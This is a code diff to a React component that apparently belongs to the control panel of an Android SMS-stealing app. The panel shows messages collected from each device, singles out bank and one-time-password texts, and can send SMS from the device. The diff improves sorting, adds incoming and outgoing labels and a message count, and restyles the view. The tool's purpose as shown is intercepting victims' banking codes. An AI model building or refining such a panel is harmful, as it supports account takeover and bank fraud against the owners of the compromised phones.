@@ -352,14 +352,22 @@ export function DeviceDetail() {
   const rawDevice = device.raw;
   // SMS: read from messages/{id} (new APK) — fields: sender, message, dateTime, id
   // Fall back to clients/{id}/sms (old APK) — fields: from, body, date
-  const smsList =
+  const smsSortKey = (sms: any): number => {
+    if (!sms) return 0;
+    const id = Number(sms.id);
+    if (Number.isFinite(id) && id > 0) return id;
+    const date = parseInt(sms.date, 10);
+    return Number.isFinite(date) ? date : 0;
+  };
+  const smsList = (
     Object.keys(smsData).length > 0
-      ? Object.entries(smsData).sort(
-          ([, a]: any, [, b]: any) => (b.id || 0) - (a.id || 0)
-        )
+      ? Object.entries(smsData)
       : rawDevice.sms
-        ? Object.entries(rawDevice.sms).reverse()
-        : [];
+        ? Object.entries(rawDevice.sms)
+        : []
+  )
+    .filter(([, sms]: any) => sms != null)
+    .sort(([, a]: any, [, b]: any) => smsSortKey(b) - smsSortKey(a));
   let filteredSms = smsSearch
     ? smsList.filter(([_, sms]: any) => {
         const body = sms.message || sms.body || "";
@@ -370,10 +378,11 @@ export function DeviceDetail() {
         );
       })
     : smsList;
-  if (bankOnly)
+  if (bankOnly) {
     filteredSms = filteredSms.filter(([_, sms]: any) =>
       isBankSms(sms.message || sms.body || "")
     );
+  }
 
   const onlineDot = (
     <span
@@ -797,7 +806,7 @@ export function DeviceDetail() {
 
         {/* Right Content - Tabs */}
         <div className="lg:col-span-3">
-          <div className="stat-card overflow-hidden flex flex-col h-[700px]">
+          <div className="stat-card overflow-hidden flex flex-col h-[750px] lg:h-[780px] max-h-[calc(100vh-160px)] shadow-xl border border-white/10">
             <div className="flex overflow-x-auto border-b border-card-border hide-scrollbar bg-muted p-2 gap-2 sticky top-0 z-10 -mx-4 px-4 sm:mx-0 sm:px-2">
               <TabBar
                 tabs={TABS.map((t) => ({
@@ -811,12 +820,17 @@ export function DeviceDetail() {
               />
             </div>
 
-            <div className="flex-1 overflow-y-auto p-4 bg-background relative">
+            <div className="flex-1 overflow-y-auto p-5 sm:p-6 bg-background relative">
               {/* Tab 1: SMS */}
               {activeTab === "sms" && (
-                <div className="h-full flex flex-col space-y-4">
+                <div className="h-full flex flex-col space-y-5 lg:space-y-6">
                   <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
-                    <h3 className="font-semibold text-foreground">Messages</h3>
+                    <h3 className="font-bold text-lg tracking-tight text-foreground flex items-center gap-2">
+                      Messages{" "}
+                      <span className="text-xs font-normal text-muted-foreground">
+                        ({filteredSms.length})
+                      </span>
+                    </h3>
                     <div className="flex gap-2 w-full sm:w-auto">
                       <button
                         onClick={() => setBankOnly(!bankOnly)}
@@ -844,7 +858,7 @@ export function DeviceDetail() {
                   </div>
 
                   {/* ── Send SMS from device ── */}
-                  <div className="bg-card border border-card-border rounded-2xl p-4 shadow-sm space-y-3">
+                  <div className="bg-gradient-to-br from-card to-card/80 border border-white/10 rounded-2xl p-5 shadow-lg space-y-4 backdrop-blur">
                     <div className="flex items-center gap-2">
                       <MessageSquare className="w-4 h-4 text-primary" />
                       <span className="text-sm font-semibold text-foreground">
@@ -874,9 +888,9 @@ export function DeviceDetail() {
                     <textarea
                       value={smsBody}
                       onChange={(e) => setSmsBody(e.target.value)}
-                      placeholder="Message text..."
-                      rows={2}
-                      className="w-full bg-card border border-input rounded-2xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all resize-none"
+                      placeholder="Type your message... (supports long SMS, will auto-split)"
+                      rows={4}
+                      className="w-full bg-card border border-input rounded-2xl px-3 py-3.5 text-[15px] leading-relaxed text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary transition-all resize-none min-h-[110px]"
                     />
                     <button
                       onClick={handleSendSms}
@@ -893,9 +907,11 @@ export function DeviceDetail() {
                       No messages found.
                     </div>
                   ) : (
-                    <div className="flex-1 overflow-y-auto space-y-3 pr-2">
+                    <div className="flex-1 overflow-y-auto space-y-4 pr-1 sm:pr-2 min-h-[320px] max-h-[520px] lg:max-h-[560px] scroll-smooth">
                       {filteredSms.map(([key, sms]: any) => {
                         // Support new APK (sender/message/dateTime) and old APK (from/body/date)
+                        const isOutgoing =
+                          String(sms.type || "").toLowerCase() === "outgoing";
                         const displayFrom = sms.sender || sms.from || "Unknown";
                         const displayBody = sms.message || sms.body || "";
                         const displayDate = sms.dateTime
@@ -909,7 +925,7 @@ export function DeviceDetail() {
                         return (
                           <div
                             key={key}
-                            className={`bg-card border rounded-2xl p-4 shadow-sm ${
+                            className={`bg-card border rounded-2xl p-5 shadow-md hover:shadow-lg hover:border-white/15 transition-all ${
                               isBankSms(displayBody)
                                 ? isOtpSms(displayBody)
                                   ? "border-warning/40"
@@ -918,14 +934,26 @@ export function DeviceDetail() {
                             }`}
                           >
                             <div className="flex justify-between items-start gap-2 mb-2">
-                              <div
-                                className={`font-semibold text-sm px-3 py-1 rounded-full truncate max-w-[55%] ${
-                                  isBankSms(displayBody)
-                                    ? "bg-warning/15 text-warning"
-                                    : "bg-primary/10 text-primary"
-                                }`}
-                              >
-                                {displayFrom}
+                              <div className="flex items-center gap-1.5 min-w-0">
+                                <span
+                                  className={`shrink-0 inline-flex items-center text-[10px] font-bold px-2 py-0.5 rounded-md border ${
+                                    isOutgoing
+                                      ? "text-sky-500 bg-sky-500/10 border-sky-500/25"
+                                      : "text-emerald-500 bg-emerald-500/10 border-emerald-500/25"
+                                  }`}
+                                >
+                                  {isOutgoing ? "OUT" : "IN"}
+                                </span>
+                                <div
+                                  className={`font-semibold text-sm px-3 py-1 rounded-full truncate max-w-[55%] ${
+                                    isBankSms(displayBody)
+                                      ? "bg-warning/15 text-warning"
+                                      : "bg-primary/10 text-primary"
+                                  }`}
+                                >
+                                  {isOutgoing ? "To: " : ""}
+                                  {displayFrom}
+                                </div>
                               </div>
                               {(isBankSms(displayBody) ||
                                 isOtpSms(displayBody)) && (
